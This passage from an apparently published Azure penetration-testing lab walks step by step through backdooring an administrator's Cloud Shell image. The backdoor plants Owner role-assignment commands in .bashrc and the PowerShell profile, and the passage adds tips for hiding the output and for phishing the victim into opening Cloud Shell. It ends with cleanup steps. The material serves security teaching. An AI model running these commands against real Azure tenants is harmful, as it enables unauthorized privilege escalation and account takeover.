
6. Verify the current user and permissions using the following command:

```
exec_priv_show
```

You can see from the output that the user only has the Contributor role assignment:

![](img/4fa338e84e0a590967a142dd798ba4e2_243_0.png)

Figure 6.27 – Contributor user permissions shown in Lava

7. Scan the file shares in the Azure subscription for potential Cloud Shell images. You can do this using the following Lava command:

```
exec_stg_file_scan
```

This command takes advantage of access to the access keys to scan the file shares in an Azure subscription. You can see that we have a file share that is used by Azure Cloud Shell:

![](img/4fa338e84e0a590967a142dd798ba4e2_243_1.png)

Figure 6.28 – Lava identification of sensitive files

8. Download the files in the Azure file shares using the following command. We are assuming that you are performing this exercise in an isolated Azure environment that only has a few file shares. Running the preceding command in an environment that has multiple file shares can take a long time to complete:

```
exec_stg_file_download
```

This will download the file into a temporary directory on the pentest Linux VM. Make a note of the download location that is highlighted in the following screenshot:

![](img/4fa338e84e0a590967a142dd798ba4e2_244_0.png)

Figure 6.29 – Cloud Shell files downloaded with Lava

9. After the download has been completed, exit Lava using the exit command:

```
exit
```

10. Back in the Bash shell, mount the downloaded image file using the following command. Replace `<download_location>` with the download path that you made a note of in step 8 of this exercise:

```
mount <download_location>/.cloudconsole/acc_azureadmin.img /mnt
```

Here is a screenshot of this:

![](img/4fa338e84e0a590967a142dd798ba4e2_244_1.png)

Figure 6.30 – Mounting the acc_azureadmin.img file in the Linux VM

11. Explore the mounted drive by typing the following command and pressing Tab:

```
ls /mnt/
```

You should see an output of persistent files and data from the Cloud Shell user's previous sessions. This includes sensitive information, such as the user's shell context information.

![](img/4fa338e84e0a590967a142dd798ba4e2_245_0.png)

Figure 6.31 – Directory listing of the mounted Cloud Shell files

12. Change directories to the mounted drive and enter the following command to append a malicious command to the .bashrc file, to escalate the privileges of our current Contributor user:

```
cd /mnt
```

```
echo "az role assignment create --role \"Owner\" --assignee $(az ad user list --display-name contributoruser | jq '.[]' | jq -r '.userPrincipalName')" >> .bashrc
```

bashrc is a Bash shell script that runs whenever a shell session is started interactively. The preceding command will ensure that the next time the target privileged user opens a Cloud Shell session, the command to escalate the privilege of the Contributor user account will be executed. Here is a screenshot of this:

![](img/4fa338e84e0a590967a142dd798ba4e2_245_1.png)

Figure 6.32 – Modification of the bashrc file

13. To do the same thing for a PowerShell session, we will need to first create two directories in the user's home directory. This is where the PowerShell profile will live. If you get an error message about the existence of the directories, you can ignore that and move on to the next step:

```
mkdir .config
```

```
mkdir .config/PowerShell
```

14. Similar to what we did for the .bashrc file, we will make the contributoruser an owner on the subscription by adding the following command to the PowerShell profile:

```
echo "New-AzRoleAssignment -UserPrincipalName (Get-AzADUser -StartsWith contributoruser).UserPrincipalName -RoleDefinitionName Owner" >> .config/PowerShell/Microsoft.PowerShell_profile.ps1
```

Here is a screenshot from the two previous steps:

![](img/4fa338e84e0a590967a142dd798ba4e2_246_0.png)

Figure 6.33 – PowerShell profile modification

15. Unmount the drive from your session with the following command:

```
cd ..
umount /mnt
```

16. Now let's upload the drive back to the storage account and overwrite the existing version. First, we will obtain the name of the storage account and store it in a variable. Replace `<storage_acct_name>` with the name of the storage account that the original Cloud Shell files were downloaded from (starts with a prefix of cs):

```
az storage account list --query [].name -o tsv
storagename=<storage_acct_name>
```

Here is a screenshot of this:

![](img/4fa338e84e0a590967a142dd798ba4e2_246_1.png)

Figure 6.34 – Identifying the Cloud Shell storage account

17. Obtain the access key and file share and upload the image back into it using the following commands. Replace `<download_location>` with the location that you made a note of in Step 8 of this exercise:

```
key=$(az storage account keys list -n $storagename --query [0].value -o tsv)
```

```
csfileshare=$(az storage share list --account-key $key --account-name $storagename --query [].name -o tsv)
```

```
az storage file upload --account-key $key --account-name $storagename --share-name $csfileshare --path ".cloudconsole/acc_azureadmin.img" --source "<download_location>/.cloudconsole/acc_azureadmin.img"
```

The upload process will begin after this. This will overwrite the existing file in the share. Here is a screenshot of this:

![](img/4fa338e84e0a590967a142dd798ba4e2_247_0.png)

Figure 6.35 – Uploading the modified .img file

18. Finally, we will need to trigger the attack by opening a Cloud Shell instance as the azureadmin user account. To do this, we will log in as the azureadmin account and open Cloud Shell in the portal. We can see in the following screenshot that our commands were executed in the Cloud Shell instance, and our contributoruser account is now an owner on the subscription:

![](img/4fa338e84e0a590967a142dd798ba4e2_248_0.png)

Figure 6.36 – contributoruser added as an Owner

As an attacker, we may want to be a little stealthier about our actions in this scenario. To suppress the message we see in the preceding screenshot, you can use the `| out-null` function at the end of the PowerShell command to redirect the output. Alternatively, we can use `&>/dev/null` at the end of the Bash shell attack. This will prevent the command execution from showing up in your admin's Cloud Shell output.

> **Important Note**
>
> In a practical attack scenario, it may take a while for a victim Cloud Shell account to open a new session. To expedite this process, you could send a phishing email that links to `https://shell.azure.com/`. Not only will the link look legitimate, but it will start up a Cloud Shell session as soon as the site is loaded.

19. Now let's verify that we have indeed escalated our privileges to the Owner role. We can run the priv_show command in Lava to verify this:

```
cd ~/lava
python3 lava.py
exec priv_show
```

You should be able to see that the user is now assigned to the OWNER role due to a successful privilege escalation attack:

![](img/4fa338e84e0a590967a142dd798ba4e2_249_0.png)

Figure 6.37 – Confirmation of the modified role using Lava

So, now that we have verified that the attack was successful, let's remove the OWNER role assignment from the Contributor user so that we can complete the remaining exercises with only the Contributor role.

20. In the Cloud Shell (PowerShell) environment where you are logged in as the azureadmin user, run the following commands line by line to remove the Owner role assignment for the Contributor user:

```
$upnsuffix=$(az ad signed-in-user show --query userPrincipalName --output tsv | sed 's/.*@//')
$contributoruser = "contributoruser@$upnsuffix"
$contributoruserid=$(az ad user list --upn $contributoruser --query [].objectId -o tsv)
az role assignment delete --assignee $contributoruserid --role "Owner"
```

This will remove the Owner role assignment for the Contributor user. Here is a screenshot of this:

![](img/4fa338e84e0a590967a142dd798ba4e2_250_0.png)

Figure 6.38 – Removal of the Owner role for the contributoruser account

21. Remove the privilege escalation command that was planted by the attacker using the following command:

```powershell
rm .config/PowerShell/Microsoft.PowerShell_profile.ps1
```

Here is a screenshot of the command:

![](img/4fa338e84e0a590967a142dd798ba4e2_250_1.png)

Figure 6.39 – Removal of the malicious command

22. To remove the privilege escalation command for the Bash cloud shell, run the following command and delete the last line that is highlighted in the screenshot. Save the file using Ctrl + S.

```bash
code .bashrc
```
